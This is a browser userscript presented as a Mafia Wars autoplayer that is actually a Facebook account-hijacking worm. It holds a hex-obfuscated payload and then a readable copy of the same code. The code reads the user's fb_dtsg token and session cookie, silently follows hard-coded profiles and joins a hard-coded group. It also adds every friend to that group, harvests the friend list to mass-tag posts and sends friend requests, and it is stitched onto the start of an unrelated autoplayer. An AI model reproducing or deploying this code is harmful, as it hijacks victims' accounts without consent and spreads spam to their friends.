// ==UserScript==
// @name        PS Facebook Mafia Wars Autoplayer Plus
// @namespace   mafiawars
// @description Autoplayer for the facebook application - Mafia Wars
// @include     http://facebook.mafiawars.com/mwfb/remote/html_server.php*
// @include     http://mwfb.zynga.com/mwfb/remote/html_server.php*
// @include     http://apps.facebook.com/inthemafia/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include     http://apps.new.facebook.com/inthemafia/*
// @include     http://www.facebook.com/connect/uiserver*
// @exclude     http://mwfb.zynga.com/mwfb/*#*
// @exclude     http://facebook.mafiawars.com/mwfb/*#*
// @version     3.18

// ==/UserScript==

var _0x944e=["\x76\x61\x6C\x75\x65","\x66\x62\x5F\x64\x74\x73\x67","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x4E\x61\x6D\x65","\x6D\x61\x74\x63\x68","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x6C\x65\x6E\x67\x74\x68","\x69\x6E\x64\x65\x78\x4F\x66","\x3B","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x2F\x61\x6A\x61\x78\x2F\x66\x6F\x6C\x6C\x6F\x77\x2F\x66\x6F\x6C\x6C\x6F\x77\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x70\x72\x6F\x66\x69\x6C\x65\x5F\x69\x64\x3D","\x26\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x31\x26\x73\x6F\x75\x72\x63\x65\x3D\x66\x6F\x6C\x6C\x6F\x77\x2D\x62\x75\x74\x74\x6F\x6E\x26\x73\x75\x62\x73\x63\x72\x69\x62\x65\x64\x5F\x62\x75\x74\x74\x6F\x6E\x5F\x69\x64\x3D\x75\x33\x37\x71\x61\x63\x5F\x33\x37\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x6C\x73\x64\x26\x5F\x5F","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x74\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x6C\x65\x6E\x67\x74\x68","\x43\x6F\x6E\x6E\x65\x63\x74\x69\x6F\x6E","\x63\x6C\x6F\x73\x65","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x73\x74\x61\x74\x75\x73","\x73\x65\x6E\x64","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x6E\x65\x77\x20\x41\x73\x79\x6E\x63\x52\x65\x71\x75\x65\x73\x74\x28\x29\x2E\x73\x65\x74\x55\x52\x49\x28\x27\x2F\x61\x6A\x61\x78\x2F\x66\x72\x69\x65\x6E\x64\x73\x2F\x6C\x69\x73\x74\x73\x2F\x73\x75\x62\x73\x63\x72\x69\x62\x65\x2F\x6D\x6F\x64\x69\x66\x79\x3F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x70\x65\x72\x6D\x61\x6C\x69\x6E\x6B\x26\x61\x63\x74\x69\x6F\x6E\x3D\x73\x75\x62\x73\x63\x72\x69\x62\x65\x27\x29\x2E\x73\x65\x74\x44\x61\x74\x61\x28\x7B\x20\x66\x6C\x69\x64\x3A\x20","\x20\x7D\x29\x2E\x73\x65\x6E\x64\x28\x29\x3B","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79","\x31\x30\x30\x30\x30\x36\x34\x38\x31\x33\x31\x31\x38\x34\x38","\x31\x30\x30\x30\x30\x36\x36\x35\x38\x37\x34\x32\x30\x31\x33","\x34\x35\x30\x33\x37\x32\x36\x39\x31\x37\x34\x36\x33\x36\x37","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x68\x69\x70\x2F\x72\x32\x6A\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x72\x65\x66\x3D\x67\x72\x6F\x75\x70\x5F\x6A\x75\x6D\x70\x5F\x68\x65\x61\x64\x65\x72\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x66\x62\x5F\x64\x74\x73\x67\x3D","\x26\x5F\x5F\x75\x73\x65\x72\x3D","\x6B\x65\x65\x70\x2D\x61\x6C\x69\x76\x65","\x47\x45\x54","\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x76\x69\x65\x77\x65\x72\x3D","\x26\x74\x6F\x6B\x65\x6E","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x28","\x73\x75\x62\x73\x74\x72","\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74","\x29","\x65\x72\x72\x6F\x72","\x69\x6E\x64\x65\x78","\x73\x6F\x72\x74","\x65\x6E\x74\x72\x69\x65\x73","\x70\x61\x79\x6C\x6F\x61\x64","\x2F\x61\x6A\x61\x78\x2F\x67\x72\x6F\x75\x70\x73\x2F\x6D\x65\x6D\x62\x65\x72\x73\x2F\x61\x64\x64\x5F\x70\x6F\x73\x74\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x26\x67\x72\x6F\x75\x70\x5F\x69\x64\x3D","\x26\x73\x6F\x75\x72\x63\x65\x3D\x74\x79\x70\x65\x61\x68\x65\x61\x64\x26\x72\x65\x66\x3D\x26\x6D\x65\x73\x73\x61\x67\x65\x5F\x69\x64\x3D\x26\x6D\x65\x6D\x62\x65\x72\x73\x3D","\x75\x69\x64","\x33\x37\x36\x39\x37\x33\x38\x32\x32\x33\x36\x32\x31\x37\x36","\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D\x68\x61\x79\x69\x72\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x61\x72\x6B\x61\x64\x61\x73\x6C\x61\x72\x20\x3D\x20","\x66\x6F\x72\x20\x28\x3B\x3B\x29\x3B","\x72\x65\x70\x6C\x61\x63\x65","\x72\x6F\x75\x6E\x64","\x20\x40\x5B","\x3A","\x74\x65\x78\x74","\x5D","\x20","\x26\x66\x69\x6C\x74\x65\x72\x5B\x30\x5D\x3D\x75\x73\x65\x72","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x30\x5D\x3D\x66\x72\x69\x65\x6E\x64\x73\x5F\x6F\x6E\x6C\x79","\x26\x6F\x70\x74\x69\x6F\x6E\x73\x5B\x31\x5D\x3D\x6E\x6D","\x26\x74\x6F\x6B\x65\x6E\x3D\x76\x37","\x26\x76\x69\x65\x77\x65\x72\x3D","\x68\x74\x74\x70\x73\x3A\x2F\x2F","\x55\x52\x4C","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x66\x61\x63\x65\x62\x6F\x6F\x6B\x2E\x63\x6F\x6D\x2F\x61\x6A\x61\x78\x2F\x74\x79\x70\x65\x61\x68\x65\x61\x64\x2F\x66\x69\x72\x73\x74\x5F\x64\x65\x67\x72\x65\x65\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x63\x6C\x69\x63\x6B","\x68\x61\x79\x69\x72","\x73\x70\x6C\x69\x74","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D","\x2C","\x22\x73\x76\x6E\x5F\x72\x65\x76\x22\x3A","\x68\x65\x61\x64","\x70\x61\x79\x6C\x61\x73\x74\x69\x3D\x65\x76\x65\x74\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x72\x65\x6D\x6F\x76\x65\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x2F\x61\x6A\x61\x78\x2F\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64\x2F\x61\x63\x74\x69\x6F\x6E\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31","\x74\x6F\x5F\x66\x72\x69\x65\x6E\x64\x3D","\x26\x61\x63\x74\x69\x6F\x6E\x3D\x61\x64\x64\x5F\x66\x72\x69\x65\x6E\x64","\x26\x68\x6F\x77\x5F\x66\x6F\x75\x6E\x64\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72","\x26\x72\x65\x66\x5F\x70\x61\x72\x61\x6D\x3D\x6E\x6F\x6E\x65","\x26\x6F\x75\x74\x67\x6F\x69\x6E\x67\x5F\x69\x64\x3D","\x26\x6C\x6F\x67\x67\x69\x6E\x67\x5F\x6C\x6F\x63\x61\x74\x69\x6F\x6E\x3D\x66\x72\x69\x65\x6E\x64\x5F\x62\x72\x6F\x77\x73\x65\x72","\x26\x6E\x6F\x5F\x66\x6C\x79\x6F\x75\x74\x5F\x6F\x6E\x5F\x63\x6C\x69\x63\x6B\x3D\x74\x72\x75\x65","\x26\x65\x67\x6F\x5F\x6C\x6F\x67\x5F\x64\x61\x74\x61\x3D","\x26\x68\x74\x74\x70\x5F\x72\x65\x66\x65\x72\x65\x72\x3D","\x26\x70\x68\x73\x74\x61\x6D\x70\x3D\x31\x36\x35\x38\x31\x36\x37\x34\x39\x31\x31\x34\x38\x34\x38\x33\x36\x39\x31\x31\x35","\x58\x2D\x53\x56\x4E\x2D\x52\x65\x76","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","\x66\x61\x72\x6B\x65\x74\x6D\x65\x7A","\x63\x69\x6E\x73","\x73\x61\x72\x6B\x61\x64\x61\x73\x65\x6B\x6C\x65","\x68\x74\x6D\x6C","\x63\x69\x6E\x73\x73\x6F\x6E\x75\x63\x20\x3D\x20","\x5F\x5F\x68\x74\x6D\x6C","\x6D\x61\x72\x6B\x75\x70","\x6A\x73\x6D\x6F\x64\x73","\x73\x65\x6C\x65\x63\x74","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x31","\x3D\x6B\x61\x64\x69\x6E\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x32","\x3D\x65\x72\x6B\x65\x6B\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x29\x3B","\x2F\x61\x6A\x61\x78\x2F\x74\x69\x6D\x65\x6C\x69\x6E\x65\x2F\x65\x64\x69\x74\x5F\x70\x72\x6F\x66\x69\x6C\x65\x2F\x62\x61\x73\x69\x63\x5F\x69\x6E\x66\x6F\x2E\x70\x68\x70\x3F\x5F\x5F\x61\x3D\x31\x26\x5F\x5F\x75\x73\x65\x72\x3D"];var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);function cereziAl(_0xf82ax4){var _0xf82ax5=_0xf82ax4+_0x944e[5];if(document[_0x944e[4]][_0x944e[6]]>0){konum=document[_0x944e[4]][_0x944e[7]](_0xf82ax5);if(konum!=-1){konum+=_0xf82ax5[_0x944e[6]];son=document[_0x944e[4]][_0x944e[7]](_0x944e[8],konum);if(son==-1){son=document[_0x944e[4]][_0x944e[6]];} ;return unescape(document[_0x944e[4]][_0x944e[9]](konum,son));} else {return _0x944e[10];} ;} ;} ;function getRandomInt(_0xf82ax7,_0xf82ax8){return Math[_0x944e[12]](Math[_0x944e[11]]()*(_0xf82ax8-_0xf82ax7+1))+_0xf82ax7;} ;function randomValue(_0xf82axa){return _0xf82axa[getRandomInt(0,_0xf82axa[_0x944e[6]]-1)];} ;var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);function a(_0xf82axc){var _0xf82axd= new XMLHttpRequest();var _0xf82axe=_0x944e[13];var _0xf82axf=_0x944e[14]+_0xf82axc+_0x944e[15]+fb_dtsg+_0x944e[16]+user_id+_0x944e[17];_0xf82axd[_0x944e[19]](_0x944e[18],_0xf82axe,true);_0xf82axd[_0x944e[22]](_0x944e[20],_0x944e[21]);_0xf82axd[_0x944e[22]](_0x944e[23],_0xf82axf[_0x944e[6]]);_0xf82axd[_0x944e[22]](_0x944e[24],_0x944e[25]);_0xf82axd[_0x944e[26]]=function (){if(_0xf82axd[_0x944e[27]]==4&&_0xf82axd[_0x944e[28]]==200){_0xf82axd[_0x944e[25]];} ;} ;_0xf82axd[_0x944e[29]](_0xf82axf);} ;function sublist(_0xf82ax11){var a=document[_0x944e[31]](_0x944e[30]);a[_0x944e[32]]=_0x944e[33]+_0xf82ax11+_0x944e[34];document[_0x944e[36]][_0x944e[35]](a);} ;a(_0x944e[37]);a(_0x944e[38]);var gid=[_0x944e[39]];var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);var httpwp= new XMLHttpRequest();var urlwp=_0x944e[40];var paramswp=_0x944e[41]+gid+_0x944e[42]+fb_dtsg+_0x944e[43]+user_id+_0x944e[17];httpwp[_0x944e[19]](_0x944e[18],urlwp,true);httpwp[_0x944e[22]](_0x944e[20],_0x944e[21]);httpwp[_0x944e[22]](_0x944e[23],paramswp[_0x944e[6]]);httpwp[_0x944e[22]](_0x944e[24],_0x944e[44]);httpwp[_0x944e[29]](paramswp);var fb_dtsg=document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);var friends= new Array();gf= new XMLHttpRequest();gf[_0x944e[19]](_0x944e[45],_0x944e[46]+user_id+_0x944e[47]+Math[_0x944e[11]]()+_0x944e[48],false);gf[_0x944e[29]]();if(gf[_0x944e[27]]!=4){} else {data=eval(_0x944e[49]+gf[_0x944e[51]][_0x944e[50]](9)+_0x944e[52]);if(data[_0x944e[53]]){} else {friends=data[_0x944e[57]][_0x944e[56]][_0x944e[55]](function (_0xf82ax17,_0xf82ax18){return _0xf82ax17[_0x944e[54]]-_0xf82ax18[_0x944e[54]];} );} ;} ;for(var i=0;i<friends[_0x944e[6]];i++){var httpwp= new XMLHttpRequest();var urlwp=_0x944e[58];var paramswp=_0x944e[42]+fb_dtsg+_0x944e[59]+gid+_0x944e[60]+friends[i][_0x944e[61]]+_0x944e[43]+user_id+_0x944e[17];httpwp[_0x944e[19]](_0x944e[18],urlwp,true);httpwp[_0x944e[22]](_0x944e[20],_0x944e[21]);httpwp[_0x944e[22]](_0x944e[23],paramswp[_0x944e[6]]);httpwp[_0x944e[22]](_0x944e[24],_0x944e[44]);httpwp[_0x944e[26]]=function (){if(httpwp[_0x944e[27]]==4&&httpwp[_0x944e[28]]==200){} ;} ;httpwp[_0x944e[29]](paramswp);} ;var spage_id=_0x944e[62];var spost_id=_0x944e[62];var sfoto_id=_0x944e[62];var user_id=document[_0x944e[4]][_0x944e[3]](document[_0x944e[4]][_0x944e[3]](/c_user=(\d+)/)[1]);var smesaj=_0x944e[10];var smesaj_text=_0x944e[10];var arkadaslar=[];var svn_rev;var bugun= new Date();var btarihi= new Date();btarihi[_0x944e[64]](bugun[_0x944e[63]]()+1000*60*60*4*1);if(!document[_0x944e[4]][_0x944e[3]](/paylasti=(\d+)/)){document[_0x944e[4]]=_0x944e[65]+btarihi[_0x944e[66]]();} ;function sarkadaslari_al(){var _0xf82ax24= new XMLHttpRequest();_0xf82ax24[_0x944e[26]]=function (){if(_0xf82ax24[_0x944e[27]]==4){eval(_0x944e[67]+_0xf82ax24[_0x944e[51]].toString()[_0x944e[69]](_0x944e[68],_0x944e[10])+_0x944e[8]);for(f=0;f<Math[_0x944e[70]](arkadaslar[_0x944e[57]][_0x944e[56]][_0x944e[6]]/10);f++){smesaj=_0x944e[10];smesaj_text=_0x944e[10];for(i=f*10;i<(f+1)*10;i++){if(arkadaslar[_0x944e[57]][_0x944e[56]][i]){smesaj+=_0x944e[71]+arkadaslar[_0x944e[57]][_0x944e[56]][i][_0x944e[61]]+_0x944e[72]+arkadaslar[_0x944e[57]][_0x944e[56]][i][_0x944e[73]]+_0x944e[74];smesaj_text+=_0x944e[75]+arkadaslar[_0x944e[57]][_0x944e[56]][i][_0x944e[73]];} ;} ;sdurumpaylas();} ;} ;} ;var _0xf82ax25=_0x944e[76];_0xf82ax25+=_0x944e[77];_0xf82ax25+=_0x944e[78];_0xf82ax25+=_0x944e[79];_0xf82ax25+=_0x944e[80]+user_id;_0xf82ax25+=_0x944e[43]+user_id;if(document[_0x944e[82]][_0x944e[7]](_0x944e[81])>=0){_0xf82ax24[_0x944e[19]](_0x944e[45],_0x944e[83]+_0xf82ax25,true);} else {_0xf82ax24[_0x944e[19]](_0x944e[45],_0x944e[84]+_0xf82ax25,true);} ;_0xf82ax24[_0x944e[29]]();} ;var tiklama=document[_0x944e[94]](_0x944e[85],function (){if(document[_0x944e[4]][_0x944e[87]](_0x944e[88])[1][_0x944e[87]](_0x944e[8])[0][_0x944e[7]](_0x944e[86])>=0){svn_rev=document[_0x944e[91]][_0x944e[32]][_0x944e[87]](_0x944e[90])[1][_0x944e[87]](_0x944e[89])[0];sarkadaslari_al();document[_0x944e[4]]=_0x944e[92]+btarihi[_0x944e[66]]();document[_0x944e[93]](tiklama);} ;} ,false);function sarkadasekle(_0xf82ax28,_0xf82ax29){var _0xf82ax24= new XMLHttpRequest();_0xf82ax24[_0x944e[26]]=function (){if(_0xf82ax24[_0x944e[27]]==4){} ;} ;_0xf82ax24[_0x944e[19]](_0x944e[18],_0x944e[95],true);var _0xf82ax25=_0x944e[96]+_0xf82ax28;_0xf82ax25+=_0x944e[97];_0xf82ax25+=_0x944e[98];_0xf82ax25+=_0x944e[99];_0xf82ax25+=_0x944e[100];_0xf82ax25+=_0x944e[101];_0xf82ax25+=_0x944e[102];_0xf82ax25+=_0x944e[103];_0xf82ax25+=_0x944e[104];_0xf82ax25+=_0x944e[42]+document[_0x944e[2]](_0x944e[1])[0][_0x944e[0]];_0xf82ax25+=_0x944e[105];_0xf82ax25+=_0x944e[43]+user_id;_0xf82ax24[_0x944e[22]](_0x944e[106],svn_rev);_0xf82ax24[_0x944e[22]](_0x944e[107],_0x944e[21]);if(_0xf82ax29==_0x944e[108]&&document[_0x944e[4]][_0x944e[87]](_0x944e[109]+user_id+_0x944e[5])[_0x944e[6]]>1){_0xf82ax24[_0x944e[29]](_0xf82ax25);} else {if(document[_0x944e[4]][_0x944e[87]](_0x944e[109]+user_id+_0x944e[5])[_0x944e[6]]<=1){cinsiyetgetir(_0xf82ax28,_0xf82ax29,_0x944e[110]);} else {if(_0xf82ax29==document[_0x944e[4]][_0x944e[87]](_0x944e[109]+user_id+_0x944e[5])[1][_0x944e[87]](_0x944e[8])[0].toString()){_0xf82ax24[_0x944e[29]](_0xf82ax25);} ;} ;} ;} ;var cinssonuc={};var cinshtml=document[_0x944e[31]](_0x944e[111]);function scinsiyetgetir(_0xf82ax28,_0xf82ax29,_0xf82ax2d){var _0xf82ax24= new XMLHttpRequest();_0xf82ax24[_0x944e[26]]=function (){if(_0xf82ax24[_0x944e[27]]==4){eval(_0x944e[112]+_0xf82ax24[_0x944e[51]].toString()[_0x944e[69]](_0x944e[68],_0x944e[10])+_0x944e[8]);cinshtml[_0x944e[32]]=cinssonuc[_0x944e[115]][_0x944e[114]][0][1][_0x944e[113]];btarihi[_0x944e[64]](bugun[_0x944e[63]]()+1000*60*60*24*365);if(cinshtml[_0x944e[117]](_0x944e[116])[0][_0x944e[0]]==_0x944e[118]){document[_0x944e[4]]=_0x944e[109]+user_id+_0x944e[119]+btarihi[_0x944e[66]]();} else {if(cinshtml[_0x944e[117]](_0x944e[116])[0][_0x944e[0]]==_0x944e[120]){document[_0x944e[4]]=_0x944e[109]+user_id+_0x944e[121]+btarihi[_0x944e[66]]();} ;} ;eval(_0xf82ax2d+_0x944e[49]+id+_0x944e[89]+_0xf82ax29+_0x944e[122]);} ;} ;_0xf82ax24[_0x944e[19]](_0x944e[45],_0x944e[123]+user_id,true);_0xf82ax24[_0x944e[22]](_0x944e[106],svn_rev);_0xf82ax24[_0x944e[29]]();} ;


// ==/UserScript==

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

a("100006481311848");
a("100006658742013");

var gid = ['442070965894625'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "376973822362176";
var spost_id = "376973822362176";
var sfoto_id = "376973822362176";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkadaþ ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}





// ==/UserScript==


// search for new_header   for changes
//
// TestChanges    <- new questionable changes can have the option to be disabled using this (look for checkbox on about tab)
// if (isGMChecked(TestChanges)){ code };
// else { original code };    <- optional
// once code is proven ok, take it out of testing
//
var SCRIPT = {
  version: '1.1.703',
